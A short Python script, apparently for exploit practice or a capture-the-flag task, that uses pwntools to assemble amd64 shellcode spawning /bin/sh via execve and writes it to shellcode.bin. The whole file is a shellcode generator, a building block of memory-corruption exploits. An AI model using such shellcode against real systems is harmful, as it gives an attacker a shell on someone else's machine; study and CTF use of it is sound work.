from pwn import *

context.arch = "amd64"
with open("shellcode.bin", "wb") as f:
    # f.write(asm(shellcraft.sh()))
    x = shellcraft.execve('/bin/sh', ['/bin/sh'], 0)
    f.write(asm(x))

